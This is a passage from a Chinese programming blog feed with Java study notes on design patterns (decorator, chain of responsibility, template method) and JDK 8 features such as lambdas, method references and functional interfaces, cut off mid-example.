<p>增加附加功能，就增加Decorator的子类，例如<code>CipherInputStream</code>。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建原始的数据源:</span></span><br><span class="line">InputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;test.gz&quot;</span>);</span><br><span class="line"><span class="comment">// 增加缓冲功能:</span></span><br><span class="line">InputStream bis = <span class="keyword">new</span> BufferedInputStream(fis);</span><br><span class="line"><span class="comment">// 增加解压缩功能:</span></span><br><span class="line">InputStream gis = <span class="keyword">new</span> GZIPInputStream(bis);</span><br></pre></td></tr></table></figure>



<h2 id="三、行为型模式"><a href="#三、行为型模式" class="headerlink" title="三、行为型模式"></a>三、行为型模式</h2><h3 id="1、责任链模式"><a href="#1、责任链模式" class="headerlink" title="1、责任链模式"></a>1、责任链模式</h3><blockquote>
<p>chain of Responsibility</p>
<p>使多个对象都有机会处理请求，将这些对象连成一条链，并沿着这条链传递请求，直到有一个对象处理它为止，避免请求的发送者与接收者之间的耦合关系。</p>
</blockquote>
<blockquote>
<p>当每个Handler都做一些工作，处理request,通常这些责任链被称为拦截器、过滤器</p>
<ul>
<li>记录日志；</li>
<li>检查权限；</li>
<li>准备相关资源；</li>
<li>…</li>
</ul>
</blockquote>
<p><strong>Servlet中filter</strong></p>
<blockquote>
<p>不但允许每个<code>Filter</code>都有机会处理请求，还允许每个<code>Filter</code>决定是否将请求“放行”给下一个<code>Filter</code>：</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AuditFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        log(req);</span><br><span class="line">        <span class="keyword">if</span> (check(req)) &#123;</span><br><span class="line">            <span class="comment">// 放行:</span></span><br><span class="line">            chain.doFilter(req, resp);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 拒绝:</span></span><br><span class="line">            sendError(resp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="2、模板模式"><a href="#2、模板模式" class="headerlink" title="2、模板模式"></a>2、模板模式</h3><blockquote>
<p>template method</p>
<p><strong>定义一个操作中的算法的骨架，而将一些步骤延迟到子类</strong></p>
<p><strong>使得子类可以不改变算法结构而重定义算法中的某些特定步骤</strong></p>
<ul>
<li>父类定义骨架，子类实现某些细节</li>
<li>为了防止子类重写父类的骨架方法，可以在父类中对骨架方法使用<code>final</code>。</li>
<li>对于需要子类实现的抽象方法，一般声明为<code>protected</code>，使得这些方法对外部客户端不可见。</li>
</ul>
</blockquote>
<p><strong>应用数据库缓存</strong></p>
<blockquote>
<p>定义一个算法骨架,而将一些步骤延迟到子类(lookupCache/putIntoCache)</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractSetting</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">getSetting</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">        String value = lookupCache(key);</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">            value = readFromDatabase(key);</span><br><span class="line">            putIntoCache(key, value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> String <span class="title">lookupCache</span><span class="params">(String key)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">putIntoCache</span><span class="params">(String key, String value)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>假设我们希望用一个<code>Map</code>做缓存，那么可以写一个<code>LocalSetting</code>：</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LocalSetting</span> <span class="keyword">extends</span> <span class="title">AbstractSetting</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, String&gt; cache = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> String <span class="title">lookupCache</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cache.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">putIntoCache</span><span class="params">(String key, String value)</span> </span>&#123;</span><br><span class="line">        cache.put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果我们要使用Redis做缓存，那么可以再写一个<code>RedisSetting</code>：</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisSetting</span> <span class="keyword">extends</span> <span class="title">AbstractSetting</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> RedisClient client = RedisClient.create(<span class="string">&quot;redis://localhost:6379&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> String <span class="title">lookupCache</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> (StatefulRedisConnection&lt;String, String&gt; connection = client.connect()) &#123;</span><br><span class="line">            RedisCommands&lt;String, String&gt; commands = connection.sync();</span><br><span class="line">            <span class="keyword">return</span> commands.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">putIntoCache</span><span class="params">(String key, String value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> (StatefulRedisConnection&lt;String, String&gt; connection = client.connect()) &#123;</span><br><span class="line">            RedisCommands&lt;String, String&gt; commands = connection.sync();</span><br><span class="line">            commands.set(key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>JDK8新特性</title>
    <url>/2020/11/11/10JDK8%E6%96%B0%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<h3 id="一、Lambda"><a href="#一、Lambda" class="headerlink" title="一、Lambda"></a>一、Lambda</h3><blockquote>
<p>函数式表示式，-&gt; 为Lambda运算符，读作（goes to）</p>
<p><strong>Lambda 表达式免去了使用匿名方法的麻烦，并且给予Java简单但是强大的函数化的编程能力。</strong></p>
<p>Lambda等价匿名实例化实现接口方法</p>
</blockquote>
<h4 id="1、格式"><a href="#1、格式" class="headerlink" title="1、格式"></a>1、格式</h4><blockquote>
<p>（形式参数）-&gt;{代码块}</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyInterface</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(String s)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyInterfaceDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//使用实现类</span></span><br><span class="line">        MyInterface myInterface1=<span class="keyword">new</span> MyInterfaceDemo1();</span><br><span class="line">        myInterface1.show(<span class="string">&quot;show1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用Lambda表达式</span></span><br><span class="line">        MyInterface myInterface=s-&gt; System.out.println(<span class="string">&quot;函数式接口&quot;</span>+s);</span><br><span class="line">        myInterface.show(<span class="string">&quot;show1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyInterfaceDemo1</span> <span class="keyword">implements</span> <span class="title">MyInterface</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;函数式接口&quot;</span>+s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="2、使用特点"><a href="#2、使用特点" class="headerlink" title="2、使用特点"></a>2、使用特点</h4><ul>
<li>不需要声明参数类型，编译器可以统一识别参数值  x-&gt;2*x</li>
<li>一个参数无需定义圆括号，但多个参数需要定义圆括号 </li>
<li>主体<strong>只有一个表达式返回值则编译器会自动返回值</strong>，大括号需要指定表达式返回一个数值<ul>
<li>(String s) -&gt;System.out.print(s)</li>
</ul>
</li>
</ul>
<h4 id="3、使用"><a href="#3、使用" class="headerlink" title="3、使用"></a>3、使用</h4><ul>
<li><strong>使用Lambda必须要有接口，接口中只能有一个抽象方法</strong></li>
<li>必须要有<strong>上下文环境</strong>，调用接口抽象方法，使用Lambda表达式可以不用写 接口实现类</li>
<li>Lambda表达式中参数和接口抽象方法的形参保持一致</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Addable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Flyable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fly</span><span class="params">(String s)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">     useAdd((<span class="keyword">int</span> x,<span class="keyword">int</span> y)-&gt;&#123;</span><br><span class="line">         <span class="keyword">return</span> x+y;</span><br><span class="line"><span class="comment">//       return x-y;</span></span><br><span class="line">     &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//省略，去掉花括号有return会报错</span></span><br><span class="line">    useAdd((x,y)-&gt;x+y);</span><br><span class="line">    <span class="comment">//Lambda</span></span><br><span class="line">    useFlyable((String s)-&gt;&#123;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(<span class="string">&quot;飞机&quot;</span>+s);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//省略,只有一个参数时，括号和花括号可以被省略</span></span><br><span class="line">    useFlyable(s -&gt; System.out.println(s));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">useAdd</span><span class="params">(Addable addable)</span></span>&#123;</span><br><span class="line">     <span class="keyword">int</span> add=addable.add(<span class="number">10</span>,<span class="number">5</span>);</span><br><span class="line">     System.out.println(add);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">useFlyable</span><span class="params">(Flyable flyable)</span></span>&#123;</span><br><span class="line">        flyable.fly(<span class="string">&quot;飞飞飞&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="4、Lambda表达式和匿名内部类"><a href="#4、Lambda表达式和匿名内部类" class="headerlink" title="4、Lambda表达式和匿名内部类"></a>4、Lambda表达式和匿名内部类</h4><ul>
<li>使用限制：Lambda表达式适用于仅有一个抽象类的接口，匿名内部类可用于多个抽象类的接口</li>
<li>所需类型：Lambda表达式只能是接口，匿名内部类可以是接口、抽象类、普通类</li>
<li>实现原理：匿名内部类编译产生一个单独.class文件，而Lambda对应的<strong>字节码动态生成</strong></li>
</ul>
<h3 id="二、接口组成更新"><a href="#二、接口组成更新" class="headerlink" title="二、接口组成更新"></a>二、接口组成更新</h3><ul>
<li>常量 public final static</li>
<li>抽象方法 public abstract</li>
<li>默认方法 default  (JDK8)</li>
<li>静态方法 static  (JDK8)</li>
<li>私有方法 private （JDK9）</li>
</ul>
<h4 id="2-1-接口默认方法"><a href="#2-1-接口默认方法" class="headerlink" title="2.1 接口默认方法"></a>2.1 接口默认方法</h4><blockquote>
<p>public default void demo1(){</p>
<p>​    System.out.print(“show1”);</p>
<p>}</p>
</blockquote>
<ul>
<li>默认方法不是抽象方法，<strong>不强制被重写</strong>，<strong>但是可以被重写</strong></li>
<li>default不能被省略</li>
</ul>
<h4 id="2-2-接口静态方法"><a href="#2-2-接口静态方法" class="headerlink" title="2.2 接口静态方法"></a>2.2 接口静态方法</h4><blockquote>
<p>public static void show(){</p>
<p>​    System.out.print(“show2”);</p>
<p>}</p>
</blockquote>
<ul>
<li>接口静态方法只能通过<strong>接口名</strong>调用，不能通过实现类或者对象名调用</li>
<li>若<code>通过实现类或者对象名调用</code>，当实现类继承多个接口时，就不知道调用哪一个接口静态方法</li>
</ul>
<h4 id="2-3-接口私有方法"><a href="#2-3-接口私有方法" class="headerlink" title="2.3 接口私有方法"></a>2.3 接口私有方法</h4><p>jdk9</p>
<blockquote>
<p>格式一</p>
<p>private void show(){</p>
<p>​    System.out.print(“show2”);</p>
<p>}</p>
</blockquote>
<blockquote>
<p>格式二</p>
<p>private static void show(){</p>
<p>​    System.out.print(“show2”);</p>
<p>}</p>
</blockquote>
<ul>
<li>接口中，默认方法可以调用私有的静态方法和非静态方法</li>
<li>静态方法只能调用私有的静态方法</li>
</ul>
<h3 id="三、方法引用"><a href="#三、方法引用" class="headerlink" title="三、方法引用"></a>三、方法引用</h3><p>引用已经存在的方法</p>
<h4 id="1、方法引用符"><a href="#1、方法引用符" class="headerlink" title="1、方法引用符"></a>1、方法引用符</h4><blockquote>
<p>：：引用运算符，所在的表达式被称为方法引用</p>
</blockquote>
<ul>
<li><p>Lambda，根据”可推导就是可省略”的原则，无需指定参数类型，也无需指定的重载形式，它们被自动推导</p>
</li>
<li><p>方法引用是Lambda表达式的孪生兄弟</p>
</li>
</ul>
<h4 id="2、引用类方法"><a href="#2、引用类方法" class="headerlink" title="2、引用类方法"></a>2、引用类方法</h4><blockquote>
<p><strong>引用类的静态方法</strong></p>
<p>格式：类名：：静态方法</p>
<p>Lambda表达式被类方法替代的时候，它的形式参数<strong>全部传递</strong>给静态方法作为参数</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Lambda表达式省略</span></span><br><span class="line">useConverter(s -&gt;Integer.parseInt(s));</span><br><span class="line"><span class="comment">//引用类方法</span></span><br><span class="line">useConverter(Integer::parseInt);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">useConverter</span><span class="params">(Converter converter)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num = converter.converter(<span class="string">&quot;666&quot;</span>);</span><br><span class="line">    System.out.println(num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="3、-引用对象的实例方法"><a href="#3、-引用对象的实例方法" class="headerlink" title="3、**引用对象的实例方法"></a>3、**引用对象的实例方法</h4><blockquote>
<p>格式：引用对象：：实例方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Printer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printUpperCase</span><span class="params">(String s)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PrintDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        usePrinter(s -&gt; System.out.println(s.toUpperCase()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//子类实现接口</span></span><br><span class="line">        PrinterDemo1 printDemo=<span class="keyword">new</span> PrinterDemo1();</span><br><span class="line">        printDemo.printUpperCase(<span class="string">&quot;hello World&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Lambda表达式</span></span><br><span class="line">        usePrinter(s-&gt;<span class="keyword">new</span> PrintString().printUpper(s));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//引用对象的实例方法</span></span><br><span class="line">        PrintString printString=<span class="keyword">new</span> PrintString();</span><br><span class="line">        usePrinter(printString::printUpper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">usePrinter</span><span class="params">(Printer printer)</span></span>&#123;</span><br><span class="line">        printer.printUpperCase(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PrinterDemo1</span> <span class="keyword">implements</span> <span class="title">Printer</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printUpperCase</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> PrintString().printUpper(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PrintString</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printUpper</span><span class="params">(String s)</span></span>&#123;</span><br><span class="line">        String s1=s.toUpperCase();</span><br><span class="line">        System.out.println(s1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="4、引用类的实例方法"><a href="#4、引用类的实例方法" class="headerlink" title="4、引用类的实例方法"></a>4、引用类的实例方法</h4><blockquote>
<p>引用类中的成员方法</p>
<p>格式： 类名：：成员方法</p>
</blockquote>
<ul>
<li>Lambda表达式被类的实例方法替代的时候</li>
<li><strong>第一个参数作为调用者</strong>，后面的参数全部传递给该方法作为参数</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    useMyString((s,x,y)-&gt;&#123;</span><br><span class="line">        <span class="keyword">return</span> s.substring(x,y);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    useMyString(String::substring);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">useMyString</span><span class="params">(MyString myString)</span></span>&#123;</span><br><span class="line">    String s=myString.mySubString(<span class="string">&quot;HelloWord&quot;</span>,<span class="number">2</span>,<span class="number">5</span>);</span><br><span class="line">    System.out.println(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="5、引用构造器"><a href="#5、引用构造器" class="headerlink" title="5、引用构造器"></a>5、引用构造器</h4><blockquote>
<p>引用构造方法</p>
<p>格式 ： 类名：：new</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        add((name,age)-&gt;&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Teacher(name,age);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        add(Teacher::<span class="keyword">new</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(Teachere teachere)</span></span>&#123;</span><br><span class="line">        Teacher teacher = teachere.show(<span class="string">&quot;小明&quot;</span>, <span class="number">11</span>);</span><br><span class="line">        System.out.println(teacher);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Teachere</span></span>&#123;</span><br><span class="line">    <span class="function">Teacher <span class="title">show</span><span class="params">(String name,<span class="keyword">int</span> age)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span></span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Teacher</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="四、函数式接口"><a href="#四、函数式接口" class="headerlink" title="四、函数式接口"></a>四、函数式接口</h3><h4 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h4><blockquote>
<p>函数式接口：有且仅有一个抽象方法的接口</p>
<p><code>@FunctiongalInterface</code></p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20200927123553414.png" alt="image-20200927123553414" style="zoom:80%;" />

<h4 id="2、使用方式"><a href="#2、使用方式" class="headerlink" title="2、使用方式"></a>2、使用方式</h4><h5 id="2-1-函数式接口作为方法的参数"><a href="#2-1-函数式接口作为方法的参数" class="headerlink" title="2.1 函数式接口作为方法的参数"></a>2.1 函数式接口作为方法的参数</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//匿名内部类形式</span></span><br><span class="line">    startThread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName()+<span class="string">&quot;线程启动&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Lambda表达式</span></span><br><span class="line">    startThread(()-&gt; System.out.println(Thread.currentThread().getName()+<span class="string">&quot;线程启动了&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">startThread</span><span class="params">(Runnable runnable)</span></span>&#123;</span><br><span class="line">    <span class="keyword">new</span> Thread(runnable).start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="2-2-函数式接口作为方法的返回值"><a href="#2-2-函数式接口作为方法的返回值" class="headerlink" title="2.2 函数式接口作为方法的返回值"></a>2.2 函数式接口作为方法的返回值</h5><blockquote>
<p>如果方法的返回值是一个函数式接口，可以使用Lambda表达式作为结果返回</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;String&gt; arrayList=<span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        arrayList.add(<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line">        arrayList.add(<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        arrayList.add(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">        Collections.sort(arrayList);</span><br><span class="line">        System.out.println(<span class="string">&quot;排序前&quot;</span>+arrayList);</span><br><span class="line"></span><br><span class="line">        Collections.sort(arrayList,getComparator());</span><br><span class="line">        System.out.println(<span class="string">&quot;排序后&quot;</span>+arrayList);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Comparator&lt;String&gt; <span class="title">getComparator</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//        return new Comparator&lt;String&gt;() &#123;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public int compare(String s1, String s2) &#123;</span></span><br><span class="line"><span class="comment">//                return s1.length()-s2.length();</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (s1,s2)-&gt;s1.length()-s2.length();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h4 id="3、函数式接口"><a href="#3、函数式接口" class="headerlink" title="3、函数式接口"></a>3、函数式接口</h4><h5 id="3-1-Supplier"><a href="#3-1-Supplier" class="headerlink" title="3.1 Supplier"></a>3.1 Supplier</h5><ul>
<li>T get() 获得结果</li>
<li>该方法不需要参数，会按照某种实现逻辑(由Lambda表达式实现) 返回一个数据</li>
<li>Supplier&lt; T&gt; 接口被称为<strong>生产型接口</strong>，指定接口的泛型是什么类型，接口中get就会生产出什么类型供我们使用</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> maxValue=getMax(()-&gt;&#123;</span><br><span class="line">       <span class="keyword">int</span>[] arr=&#123;<span class="number">1</span>,<span class="number">4</span>,<span class="number">23</span>,<span class="number">12</span>,<span class="number">44</span>&#125;;</span><br><span class="line">       <span class="keyword">int</span> max=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">           <span class="keyword">if</span> (arr[i] &gt;= arr[max])&#123;</span><br><span class="line">                max=i;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> arr[max];</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    System.out.println(maxValue);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Integer <span class="title">getMax</span><span class="params">(Supplier&lt;Integer&gt; supplier)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> supplier.get();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="3-2-Consumer"><a href="#3-2-Consumer" class="headerlink" title="3.2 Consumer"></a>3.2 Consumer</h5><ul>
<li><strong>消费型接口</strong>，它消费的数据的数据类型由泛型指定</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        operatorString(<span class="string">&quot;林青霞&quot;</span>,s -&gt; System.out.println(<span class="keyword">new</span> StringBuffer(s).reverse().toString())</span><br><span class="line">        ,System.out::println);</span><br><span class="line">     operatorString(<span class="string">&quot;凌青霞&quot;</span>,<span class="number">34</span>,System.out::print,i-&gt; System.out.print(String.valueOf(i+<span class="number">200</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *定义一个方法，用不同方式消费同一个字符串数据俩次</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">operatorString</span><span class="params">(String name,Consumer&lt;String&gt; consumer,Consumer&lt;String&gt; consumer1)</span></span>&#123;</span><br><span class="line"><span class="comment">//   consumer.accept(name);</span></span><br><span class="line"><span class="comment">//   consumer1.accept(name);</span></span><br><span class="line">  consumer.andThen(consumer1).accept(name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">operatorString</span><span class="params">(String name,<span class="keyword">int</span> age,Consumer&lt;String&gt; consumer,Consumer&lt;Integer&gt; consumer1)</span></span>&#123;</span><br><span class="line">        consumer.accept(name);</span><br><span 